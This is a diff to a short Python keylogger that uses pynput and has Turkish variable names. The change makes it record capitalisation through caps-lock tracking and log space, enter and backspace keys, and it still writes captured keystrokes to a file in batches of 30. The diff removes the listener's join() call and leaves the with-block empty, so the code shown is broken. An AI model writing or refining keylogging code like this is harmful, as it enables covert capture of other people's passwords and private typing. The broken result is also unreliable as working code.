@@ -1,14 +1,31 @@
 from pynput.keyboard import Listener,Key
 
 liste=list()
+capsdurum=False
 
 def bas(key):
-    global liste 
+    global liste,capsdurum
 
     try:
-        liste.append(key.char)
+        if capsdurum:
+            liste.append(key.char.upper())
+        else:
+            liste.append(key.char)                
+        
     except:
-        pass
+        if key==Key.space:
+            liste.append(" ")
+        if key==Key.enter:
+            liste.append("\n")
+        if key==Key.backspace:
+            liste.append("'<'")
+        if key==Key.caps_lock:
+            if capsdurum:
+                capsdurum=False
+            else:
+                capsdurum=True
+
+
 
     if len(liste)>=30:
         dosya_yaz()
@@ -28,5 +45,3 @@ def dosya_yaz():
             
 with Listener(on_press=bas, on_release=birak) as dinleyici:
 
-
-    dinleyici.join()
